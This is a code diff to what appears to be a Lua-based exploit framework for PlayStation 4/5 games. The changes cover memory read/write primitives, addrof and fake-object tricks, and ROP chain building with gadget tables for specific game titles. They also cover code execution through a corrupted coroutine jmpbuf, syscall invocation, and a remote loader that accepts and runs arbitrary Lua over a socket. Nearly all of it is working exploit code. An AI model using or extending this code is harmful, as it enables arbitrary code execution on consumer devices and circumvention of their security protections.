@@ -14,6 +14,7 @@ if not options.log_to_klog then
     log_fd = io.open(LOG_FILE, "w")
 end
 
+game_name = nil
 eboot_base = nil
 libc_base = nil
 libkernel_base = nil
@@ -1195,45 +1196,43 @@ function lua.resolve_game(luaB_auxwrap)
     local nibbles = luaB_auxwrap:band(uint64(0xfff)):tonumber()
     print("[+] luaB_auxwrap nibbles: " .. hex(nibbles))
     
-    if not games_identification[nibbles] then
-        print("[-] Game not identified. Falling back to Raspberry Cube")
-        eboot_addrofs = gadget_table.raspberry_cube.eboot_addrofs
-        libc_addrofs = gadget_table.raspberry_cube.libc_addrofs
-        gadgets = gadget_table.raspberry_cube.gadgets
-        return
+    game_name = games_identification[nibbles]
+
+    if not game_name then
+        errorf("unsupported game (luaB_auxwrap nibbles: %s)", hex(nibbles))
     end
     
-    if games_identification[nibbles] == "RaspberryCube" then
+    if game_name == "RaspberryCube" then
         print("[+] Game identified as Raspberry Cube")
         eboot_addrofs = gadget_table.raspberry_cube.eboot_addrofs
         libc_addrofs = gadget_table.raspberry_cube.libc_addrofs
         gadgets = gadget_table.raspberry_cube.gadgets
-    elseif games_identification[nibbles] == "Aibeya" then
+    elseif game_name == "Aibeya" then
         print("[+] Game identified as Aibeya/B/G")
         eboot_addrofs = gadget_table.aibeya.eboot_addrofs
         libc_addrofs = gadget_table.aibeya.libc_addrofs
         gadgets = gadget_table.aibeya.gadgets
-    elseif games_identification[nibbles] == "HamidashiCreative" then
+    elseif game_name == "HamidashiCreative" then
         print("[+] Game identified as Hamidashi Creative")
         eboot_addrofs = gadget_table.hamidashi_creative.eboot_addrofs
         libc_addrofs = gadget_table.hamidashi_creative.libc_addrofs
         gadgets = gadget_table.hamidashi_creative.gadgets
-    elseif games_identification[nibbles] == "AikagiKimiIsshoniPack" then
+    elseif game_name == "AikagiKimiIsshoniPack" then
         print("[+] Game identified as Aikagi Kimi to Issho ni Pack")
         eboot_addrofs = gadget_table.aikagi_kimi_isshoni_pack.eboot_addrofs
         libc_addrofs = gadget_table.aikagi_kimi_isshoni_pack.libc_addrofs
         gadgets = gadget_table.aikagi_kimi_isshoni_pack.gadgets
-    elseif games_identification[nibbles] == "C" then -- TODO: Test
+    elseif game_name == "C" then -- TODO: Test
         print("[+] Game identified as C/D")
         eboot_addrofs = gadget_table.c.eboot_addrofs
         libc_addrofs = gadget_table.c.libc_addrofs
         gadgets = gadget_table.c.gadgets
-    elseif games_identification[nibbles] == "E" then -- TODO: Test
+    elseif game_name == "E" then -- TODO: Test
         print("[+] Game identified as E")
         eboot_addrofs = gadget_table.e.eboot_addrofs
         libc_addrofs = gadget_table.e.libc_addrofs
         gadgets = gadget_table.e.gadgets
-    elseif games_identification[nibbles] == "F" then -- TODO: Test
+    elseif game_name == "F" then -- TODO: Test
         print("[+] Game identified as F")
         eboot_addrofs = gadget_table.f.eboot_addrofs
         libc_addrofs = gadget_table.f.libc_addrofs
@@ -1252,7 +1251,7 @@ function lua.resolve_address()
         consume[i] = co
 
         -- read f field of CClosure (luaB_auxwrap)
-        local addr = lua.read_qword(lua.addrof(co)+0x20)
+        local addr = memory.read_qword(lua.addrof(co)+0x20)
         if addr then
             -- calculate eboot base from luaB_auxwrap offset
             luaB_auxwrap = addr
@@ -1294,7 +1293,7 @@ function lua.resolve_address()
     lua.setup_better_read_primitive()
 
     -- resolve libc
-    libc_base = lua.read_qword(eboot_addrofs.longjmp_import) - libc_addrofs.longjmp
+    libc_base = memory.read_qword(eboot_addrofs.longjmp_import) - libc_addrofs.longjmp
     print("[+] libc base @ " .. hex(libc_base))
     
     for k,offset in pairs(libc_addrofs) do 
@@ -1306,7 +1305,7 @@ end
 function lua.setup_victim_table()
     assert(lua.fake_str)
     local t = { 1, 2 }
-    local array_addr = lua.read_qword(lua.addrof(t)+24)
+    local array_addr = memory.read_qword(lua.addrof(t)+24)
     if array_addr then
         if lua.read_buffer(array_addr, 1) then  -- test if we can read the buffer
             lua.tbl_victim, lua.tbl_victim_array_addr = t, array_addr
@@ -1320,7 +1319,7 @@ end
 function lua.get_obj_value(obj)
     if not lua.tbl_victim then return nil end
     lua.tbl_victim[1] = obj
-    return lua.read_qword(lua.tbl_victim_array_addr)
+    return memory.read_qword(lua.tbl_victim_array_addr)
 end
 
 function lua.addrof_trivial(x)
@@ -1381,7 +1380,7 @@ function lua.memcpy(dest, src, size)
     if size % 8 ~= 0 then
         errorf("lua.memcpy() needs size to be aligned by 8 bytes (given %s)", hex(size))
     end
-    lua.write_multiple_qwords(dest, lua.read_multiple_qwords(src, size / 8))
+    lua.write_multiple_qwords(dest, memory.read_multiple_qwords(src, size / 8))
 end
 
 function lua.create_fake_cclosure(addr)
@@ -1461,12 +1460,21 @@ end
 
 function memory.read_dword(addr)
     local value = memory.read_buffer(addr, 4)
-    return value and uint64.unpack(value) or nil 
+    return value and #value == 4 and uint64.unpack(value) or nil 
 end
 
 function memory.read_qword(addr)
     local value = memory.read_buffer(addr, 8)
-    return value and uint64.unpack(value) or nil 
+    return value and #value == 8 and uint64.unpack(value) or nil 
+end
+
+function memory.read_multiple_qwords(addr, count)
+    local qwords = {}
+    local buffer = memory.read_buffer(addr, count*8)
+    for i=0,(#buffer/8)-1 do
+        table.insert(qwords, uint64.unpack(buffer:sub(i*8+1, i*8+8)))
+    end
+    return qwords
 end
 
 function memory.write_buffer(dest, buffer)
@@ -1545,13 +1553,19 @@ function ropchain:new(opt)
 
     self.stack_size = opt.stack_size or 0x2000
     self.stack_base = opt.stack_base or memory.alloc(self.stack_size)
-    self.stack_offset = opt.start_from_base and 0 or 8
+    self.align_offset = 0
+    self.stack_offset = 0
+    
+    -- assume that first stack slot is consumed by longjmp
+    if not opt.start_from_base then
+        self.stack_offset = 8
+    end
 
     -- align stack base to 16 bytes
     if self.stack_base:tonumber() % 16 ~= 0 then
         local jmp_to = align_16(self.stack_base + self.stack_offset) + 0x20
         self.push_set_rsp(self, jmp_to)
-        self.stack_base = jmp_to
+        self.align_offset = jmp_to - self.stack_base
         self.stack_offset = 0
     end
 
@@ -1564,10 +1578,10 @@ function ropchain:new(opt)
     return self
 end
 
-function ropchain.create_fcall_stub(size)
+function ropchain.create_fcall_stub(padding_size)
     
     ropchain.fcall_stub = {}
-    ropchain.fcall_stub.fn_addr = memory.alloc(size) + (size - 0x100)  -- large padding
+    ropchain.fcall_stub.fn_addr = memory.alloc(padding_size) + (padding_size - 0x100)
     
     local stub = ropchain({
         stack_base = ropchain.fcall_stub.fn_addr,
@@ -1592,7 +1606,16 @@ function ropchain:__tostring()
     table.insert(result, string.format("ropchain @ %s (size: %s)\n", 
         hex(self.stack_base), hex(self.stack_offset)))
 
-    local qwords = lua.read_multiple_qwords(self.stack_base, self.stack_offset / 8)
+    table.insert(result, string.format("fcall_stub.fn_addr: %s",
+        hex(ropchain.fcall_stub.fn_addr)))
+
+    table.insert(result, string.format("fcall_stub.retval_addr: %s",
+        hex(ropchain.fcall_stub.retval_addr)))
+
+    table.insert(result, string.format("fcall_stub.return_addr: %s\n",
+        hex(ropchain.fcall_stub.return_addr)))
+
+    local qwords = memory.read_multiple_qwords(self.stack_base + self.align_offset, self.stack_offset / 8)
 
     local value_symbol = {}
     for i,t in ipairs({gadgets, eboot_addrofs, libc_addrofs}) do
@@ -1618,7 +1641,7 @@ function ropchain:__tostring()
 end
 
 function ropchain:get_rsp() 
-    return self.stack_base + self.stack_offset
+    return self.stack_base + self.align_offset + self.stack_offset
 end
 
 -- align stack to 16 bytes
@@ -1881,23 +1904,25 @@ end
 function ropchain:push_fcall_raw(rip, prep_arg_callback, is_ptr)
 
     local ret_value = memory.alloc(8)
+    local fcall_stub = ropchain.fcall_stub
+
     table.insert(self.retval_addr, ret_value)
 
     if is_ptr then
         self:push_set_rax_from_memory(rip)
-        self:push_store_rax_into_memory(ropchain.fcall_stub.fn_addr)
+        self:push_store_rax_into_memory(fcall_stub.fn_addr)
     else
-        self:push_write_qword_memory(ropchain.fcall_stub.fn_addr, rip)
+        self:push_write_qword_memory(fcall_stub.fn_addr, rip)
     end
 
-    self:push_write_qword_memory(ropchain.fcall_stub.retval_addr, ret_value)
+    self:push_write_qword_memory(fcall_stub.retval_addr, ret_value)
 
     local push_size = 0
 
     local push_cb = function()
-        self:push_write_qword_memory(ropchain.fcall_stub.return_addr, self:get_rsp() + push_size)
+        self:push_write_qword_memory(fcall_stub.return_addr, self:get_rsp() + push_size)
         prep_arg_callback()
-        self:push_set_rsp(ropchain.fcall_stub.fn_addr)
+        self:push_set_rsp(fcall_stub.fn_addr)
     end
 
     push_size = self:mock_push(push_cb)
@@ -1919,7 +1944,7 @@ end
 function ropchain:get_retval()
     local retval = {}
     for i,v in ipairs(self.retval_addr) do
-        table.insert(retval, lua.read_qword(v))
+        table.insert(retval, memory.read_qword(v))
     end
     return retval
 end
@@ -2000,14 +2025,10 @@ end
 -- corrupt coroutine's jmpbuf for code execution
 function ropchain:execute_through_coroutine()
 
-    if not self.finalized then
-        error("ropchain:execute_through_coroutine() requires restore_through_longjmp() to be called first")
-    end
-
     local run_hax = function(lua_state_addr)
 
         -- backup original jmpbuf
-        local jmpbuf_addr = lua.read_qword(lua_state_addr+0xa8) + 0x8
+        local jmpbuf_addr = memory.read_qword(lua_state_addr+0xa8) + 0x8
         lua.memcpy(self.jmpbuf, jmpbuf_addr, 0x100)
 
         -- overwrite registers in jmpbuf
@@ -2030,21 +2051,21 @@ end
 
 
 --
--- create fcall class
+-- fcall class
 --
--- helper to execute function or syscall through rop
+-- helper to execute function or system call through rop
 --
 
 fcall = {}
 fcall.__index = fcall
 
 setmetatable(fcall, {
-    __call = function(_, fn_addr, rax)  -- make class callable as constructor
-        return fcall:new(fn_addr, rax)
+    __call = function(_, fn_addr, syscall_no)  -- make class callable as constructor
+        return fcall:new(fn_addr, syscall_no)
     end
 })
 
-function fcall:new(fn_addr, rax)
+function fcall:new(fn_addr, syscall_no)
 
     assert(fn_addr, "invalid function address")
     
@@ -2054,7 +2075,7 @@ function fcall:new(fn_addr, rax)
 
     local self = setmetatable({}, fcall)
     self.fn_addr = fn_addr
-    self.rax = rax
+    self.syscall_no = syscall_no
     return self
 end
 
@@ -2062,7 +2083,7 @@ function fcall.create_initial_chain()
 
     local arg_addr = {
         fn_addr = memory.alloc(8),
-        rax = memory.alloc(8),
+        syscall_no = memory.alloc(8),
         rdi = memory.alloc(8),
         rsi = memory.alloc(8),
         rdx = memory.alloc(8),
@@ -2080,7 +2101,7 @@ function fcall.create_initial_chain()
         chain:push_set_reg_from_memory("rdx", arg_addr.rdx)
         chain:push_set_reg_from_memory("rsi", arg_addr.rsi)
         chain:push_set_reg_from_memory("rdi", arg_addr.rdi)
-        chain:push_set_rax_from_memory(arg_addr.rax)
+        chain:push_set_rax_from_memory(arg_addr.syscall_no)
     end
     
     chain:push_fcall_raw(arg_addr.fn_addr, prep_arg_callback, true)
@@ -2092,11 +2113,11 @@ end
 
 function fcall:__call(rdi, rsi, rdx, rcx, r8, r9)
     if native_invoke then
-        return native.fcall_with_rax(self.fn_addr, self.rax, rdi, rsi, rdx, rcx, r8, r9)
+        return native.fcall_with_rax(self.fn_addr, self.syscall_no, rdi, rsi, rdx, rcx, r8, r9)
     else
         local arg_addr = fcall.arg_addr
         lua.write_qword(arg_addr.fn_addr, self.fn_addr)
-        lua.write_qword(arg_addr.rax, self.rax or 0)
+        lua.write_qword(arg_addr.syscall_no, self.syscall_no or 0)
         lua.write_qword(arg_addr.rdi, ropchain.resolve_value(rdi or 0))
         lua.write_qword(arg_addr.rsi, ropchain.resolve_value(rsi or 0))
         lua.write_qword(arg_addr.rdx, ropchain.resolve_value(rdx or 0))
@@ -2145,14 +2166,16 @@ end
 
 function syscall.resolve(list)
     for name, num in pairs(list) do
-        if PLATFORM == "ps4" and not syscall[name] then
-            if syscall.syscall_wrapper[num] then
-                syscall[name] = fcall(syscall.syscall_wrapper[num])
-            else
-                printf("warning: syscall %s (%d) not found", name, num)
+        if not syscall[name] then
+            if PLATFORM == "ps4" then
+                if syscall.syscall_wrapper[num] then
+                    syscall[name] = fcall(syscall.syscall_wrapper[num], num)
+                else
+                    printf("warning: syscall %s (%d) not found", name, num)
+                end
+            elseif PLATFORM == "ps5" then
+                syscall[name] = fcall(syscall.syscall_address, num)
             end
-        elseif PLATFORM == "ps5" and not syscall[name] then
-            syscall[name] = fcall(syscall.syscall_address, num)
         end
     end
 end
@@ -2202,8 +2225,10 @@ end
 function run_lua_code(lua_code, client_fd)
 
     local script, err = loadstring(lua_code)
-    if not script then
-        return "error loading script: " .. err
+    if err then
+        local err_msg = "error loading script: " .. err
+        syscall.write(client_fd, err_msg, #err_msg)
+        return
     end
 
     local env = {
@@ -2306,11 +2331,22 @@ function remote_lua_loader(port)
         
         printf("[+] accepted new connection client fd %d", client_fd)
 
-        if size > 0 and size < maxsize then            
+        if size > 0 and size < maxsize then
             
-            syscall.read(client_fd, buf, size)
+            local cur_size = size
+            local cur_buf = buf
+            
+            while cur_size > 0 do
+                local read_size = syscall.read(client_fd, cur_buf, cur_size):tonumber()
+                if read_size < 0 then
+                    error("read() error: " .. get_error_string())
+                end
+                cur_buf = cur_buf + read_size
+                cur_size = cur_size - read_size
+            end
+            
             local lua_code = memory.read_buffer(buf, size)
-            
+
             printf("[+] accepted lua code with size %d (%s)", #lua_code, hex(#lua_code))
             
             if options.enable_signal_handler then
@@ -2341,14 +2377,14 @@ end
 
 function resolve_base(initial_addr, modname, max_page_search)
 
-    local base_addr = initial_addr:band(uint64(0xfff):bnot())
+    local initial_page = initial_addr:band(uint64(0xfff):bnot())
     local page_size = 0x1000
 
-    for i=1, max_page_search do
-        local base = base_addr - i*page_size
+    for i=0, max_page_search-1 do
+        local base = initial_page - i*page_size
         local cur_modname = get_module_name(base)
         local prev_modname = get_module_name(base - page_size)
-        if cur_modname == "libkernel.sprx" and prev_modname ~= "libkernel.sprx" then
+        if cur_modname == modname and prev_modname ~= modname then
             return base
         end
     end
@@ -2499,15 +2535,17 @@ function native.create_dispatcher(pivot_handler)
     -- backup current context
     dispatcher:push_fcall(libc_addrofs.setjmp, jmpbuf_backup)
 
-    -- fix rsp
-    dispatcher:push_set_rax_from_memory(jmpbuf_backup+0x18)
-    dispatcher:push_add_to_rax(-0x78)  -- calc rsp from rbp
-    dispatcher:push_store_rax_into_memory(jmpbuf_backup+0x10)
-
-    -- fix rip
-    dispatcher:push_set_rax_from_memory(jmpbuf_backup+0x10)
-    dispatcher:push(gadgets["mov rax, [rax]; ret"])
-    dispatcher:push_store_rax_into_memory(jmpbuf_backup)
+    -- todo: setting hardcoded offset like this is bad. improve this
+    local stack_offset = -0x78
+    if game_name == "HamidashiCreative" then
+        stack_offset = -0x68
+    end
+    
+    dispatcher:push_set_rax_from_memory(jmpbuf_backup+0x18)  -- get rbp
+    dispatcher:push_add_to_rax(stack_offset)  -- calc rsp from rbp
+    dispatcher:push_store_rax_into_memory(jmpbuf_backup+0x10)  -- fix rsp
+    dispatcher:push(gadgets["mov rax, [rax]; ret"])  -- get ret addr from rsp
+    dispatcher:push_store_rax_into_memory(jmpbuf_backup)  -- fix rip
 
     native.get_lua_opt(dispatcher, eboot_addrofs.luaL_optinteger, lua_state, 1, 0)
 
@@ -2604,20 +2642,11 @@ function signal.setup_handler(pivot_handler)
     local mcontext_offset = 0x40
     local reg_rbp_offset = 0x48
     local reg_rsp_offset = 0xb8    
-
-    local sys_write_no = 4
-    local sys_write_addr = nil
-
+    
     local ucontext_struct_addr = memory.alloc(8)
     local output_addr = memory.alloc(0x18)
     
     signal.fd_addr = memory.alloc(8)
-    
-    if PLATFORM == "ps4" then
-        sys_write_addr = syscall.syscall_wrapper[sys_write_no]
-    elseif PLATFORM == "ps5" then
-        sys_write_addr = syscall.syscall_address
-    end
 
     syscall_mmap(pivot_handler.pivot_base, 0x2000)
 
@@ -2636,15 +2665,15 @@ function signal.setup_handler(pivot_handler)
     chain:push_store_rdx_into_memory(ucontext_struct_addr)
 
     -- send signal info to client
-    chain:push_fcall_raw(sys_write_addr, function()
+    chain:push_fcall_raw(syscall.write.fn_addr, function()
         chain:push_set_rdx(0x18)
         chain:push_set_rsi(output_addr)
         chain:push_set_reg_from_memory("rdi", signal.fd_addr)
-        chain:push_set_rax(sys_write_no)
+        chain:push_set_rax(syscall.write.syscall_no)
     end)
 
     -- send mcontext buffer to client
-    chain:push_fcall_raw(sys_write_addr, function()
+    chain:push_fcall_raw(syscall.write.fn_addr, function()
 
         chain:push_set_rdx(0x100)
 
@@ -2653,7 +2682,7 @@ function signal.setup_handler(pivot_handler)
         chain:push_set_reg_from_rax("rsi")
 
         chain:push_set_reg_from_memory("rdi", signal.fd_addr)
-        chain:push_set_rax(sys_write_no)
+        chain:push_set_rax(syscall.write.syscall_no)
     end)
 
     --
